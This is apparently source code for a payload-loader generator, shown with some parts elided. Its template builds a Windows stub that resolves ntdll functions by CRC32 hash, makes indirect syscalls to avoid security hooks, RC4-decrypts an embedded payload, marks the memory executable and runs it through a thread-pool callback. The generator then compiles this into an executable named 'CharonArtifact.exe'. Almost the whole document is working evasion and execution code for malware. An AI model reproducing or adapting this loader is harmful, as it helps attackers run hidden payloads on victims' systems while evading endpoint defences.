...
const char *g_StubTemplate =
    ...
    "(PIMAGE_NT_HEADERS)((ULONG_PTR)g_NtdllConf.uModule + pDos->e_lfanew);\n"
    "    PIMAGE_EXPORT_DIRECTORY pExport = "
    "(PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)g_NtdllConf.uModule + "
    "pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]."
    "VirtualAddress);\n"
    "    g_NtdllConf.dwNumberOfNames = pExport->NumberOfNames;\n"
    "    g_NtdllConf.pdwArrayOfNames = (PDWORD)((ULONG_PTR)g_NtdllConf.uModule "
    "+ pExport->AddressOfNames);\n"
    "    g_NtdllConf.pdwArrayOfAddresses = "
    "(PDWORD)((ULONG_PTR)g_NtdllConf.uModule + pExport->AddressOfFunctions);\n"
    "    g_NtdllConf.pwArrayOfOrdinals = "
    "(PWORD)((ULONG_PTR)g_NtdllConf.uModule + "
    ...
    "        PCHAR pcFuncName = (PCHAR)((ULONG_PTR)g_NtdllConf.uModule + "
    "g_NtdllConf.pdwArrayOfNames[i]);\n"
    "        PVOID pFuncAddress = (PVOID)((ULONG_PTR)g_NtdllConf.uModule + "
    ...
    "            if (*((PBYTE)pFuncAddress) == 0x4C && *((PBYTE)pFuncAddress + "
    "1) == 0x8B && *((PBYTE)pFuncAddress + 2) == 0xD1 && *((PBYTE)pFuncAddress "
    "+ 3) == 0xB8) {\n"
    ...
    "DOWN);\n"
    "                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * "
    "DOWN);\n"
    ...
    "x) == 0x05) {\n"
    "            pNtSys->pSyscallInstAddress = (PVOID)((ULONG_PTR)uFuncAddress "
    "+ z);\n"
    "            break;\n"
    "        }\n"
    "    }\n"
    "    if (pNtSys->dwSSn != 0 && pNtSys->pSyscallAddress != NULL && "
    "pNtSys->dwSyscallHash != 0 && pNtSys->pSyscallInstAddress != NULL) return "
    "TRUE;\n"
    "    else return FALSE;\n"
    "}\n"
    "\n"
    "PVOID FetchNtFunc(IN DWORD dwSysHash) {\n"
    "    if (!g_NtdllConf.uModule) {\n"
    "        if (!InitNtdllConfigStructure()) return NULL;\n"
    "    }\n"
    "    for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {\n"
    "        PCHAR pcFuncName = (PCHAR)((ULONG_PTR)g_NtdllConf.uModule + "
    "g_NtdllConf.pdwArrayOfNames[i]);\n"
    ...
    "#define TpAllocWork_CRC32               0xA21AB643\n"
    "#define TpPostWork_CRC32                0xD8D26399\n"
    "#define TpReleaseWork_CRC32             0xF4D0358E\n"
    "#define TpWaitForWork_CRC32             0xDA24C32C\n"
    "\n"
    ...
    "NTAPI_FUNC g_Nt = { 0 };\n"
    "\n"
    "typedef NTSTATUS (NTAPI *fnTpAllocWork)(PVOID* WorkReturn, PVOID "
    "TaskHandler, PVOID OptionalArgument, PVOID CallbackEnvironment);\n"
    "typedef NTSTATUS (NTAPI *fnTpPostWork)(PVOID Work);\n"
    "typedef NTSTATUS (NTAPI *fnTpReleaseWork)(PVOID Work);\n"
    "typedef NTSTATUS (NTAPI *fnTpWaitForWork)(PVOID Work, BOOLEAN "
    "CancelPendingCallbacks);\n"
    "\n"
    "typedef struct _NT_FUNCS {\n"
    "    fnTpAllocWork TpAllocWork;\n"
    "    fnTpPostWork TpPostWork;\n"
    "    fnTpReleaseWork TpReleaseWork;\n"
    "    fnTpWaitForWork TpWaitForWork;\n"
    "} NT_FUNCS, *PNT_FUNCS;\n"
    "NT_FUNCS g_NtFuncs = { 0 };\n"
    "\n"
    "BOOL InitializeNtSyscalls() {\n"
    "    if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, "
    "&g_Nt.NtAllocateVirtualMemory)) return FALSE;\n"
    "    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, "
    "&g_Nt.NtProtectVirtualMemory)) return FALSE;\n"
    "\n"
    "    g_NtFuncs.TpAllocWork = "
    "(fnTpAllocWork)FetchNtFunc(TpAllocWork_CRC32);\n"
    "    g_NtFuncs.TpPostWork = (fnTpPostWork)FetchNtFunc(TpPostWork_CRC32);\n"
    "    g_NtFuncs.TpReleaseWork = "
    "(fnTpReleaseWork)FetchNtFunc(TpReleaseWork_CRC32);\n"
    "    g_NtFuncs.TpWaitForWork = "
    "(fnTpWaitForWork)FetchNtFunc(TpWaitForWork_CRC32);\n"
    "\n"
    "    if (!g_NtFuncs.TpAllocWork || !g_NtFuncs.TpPostWork || "
    "!g_NtFuncs.TpReleaseWork || !g_NtFuncs.TpWaitForWork) return FALSE;\n"
    "    return TRUE;\n"
    "}\n"
    "\n"
    "BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE "
    ...
    "    for (int i = 0; i < KEY_SIZE; i++) RealKey[i] = (BYTE)((pRc4Key[i] ^ "
    "b) - i);\n"
    "    \n"
    ...
    "FALSE; }\n"
    "    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) { printf(\"[!] "
    "Decryption Error: 0x%X\\n\", STATUS); return FALSE; }\n"
    "    return TRUE;\n"
    "}\n"
    "\n"
    "int main() {\n"
    ...
    "    if (!InitializeNtSyscalls()) { printf(\"[!] Syscall Init "
    "Failed\\n\"); getchar(); return -1; }\n"
    "\n"
    "    printf(\"[*] Allocating Memory...\\n\");\n"
    "    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);\n"
    "    if (RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | "
    "MEM_RESERVE, PAGE_READWRITE) != 0 || pAddress == NULL) {\n"
    "        printf(\"[!] Alloc Failed\\n\"); getchar(); return -1;\n"
    "    }\n"
    "\n"
    "    printf(\"[*] Decrypting Payload...\\n\");\n"
    "    memcpy(pAddress, Rc4CipherText, sizeof(Rc4CipherText));\n"
    "    if (!Rc4EncryptionViSystemFunc032(ProtectedKey, (PBYTE)pAddress, "
    "sizeof(ProtectedKey), (DWORD)sizeof(Rc4CipherText))) {\n"
    ...
    "    if (RunSyscall(hProcess, &pAddress, &sSize, PAGE_EXECUTE_READ, "
    "&dwOld) != 0) {\n"
    "        printf(\"[!] Protect Failed\\n\"); getchar(); return -1;\n"
    "    }\n"
    "\n"
    "    printf(\"[*] Executing via TpAllocWork (Callback)...\\n\");\n"
    "    PVOID pWork = NULL;\n"
    "    if (g_NtFuncs.TpAllocWork(&pWork, pAddress, NULL, NULL) != 0) {\n"
    "        printf(\"[!] TpAllocWork Failed\\n\"); getchar(); return -1;\n"
    "    }\n"
    "\n"
    "    if (g_NtFuncs.TpPostWork(pWork) != 0) {\n"
    "        printf(\"[!] TpPostWork Failed\\n\"); getchar(); return -1;\n"
    "    }\n"
    "\n"
    "    printf(\"[*] Waiting for payload...\\n\");\n"
    "    g_NtFuncs.TpWaitForWork(pWork, FALSE);\n"
    "    g_NtFuncs.TpReleaseWork(pWork);\n"
    "    \n"
...
int main(int argc, char *argv[]) {
  ...
  int res =
      system("cl /nologo /O2 artifact.c syscalls.obj /Fe:CharonArtifact.exe");
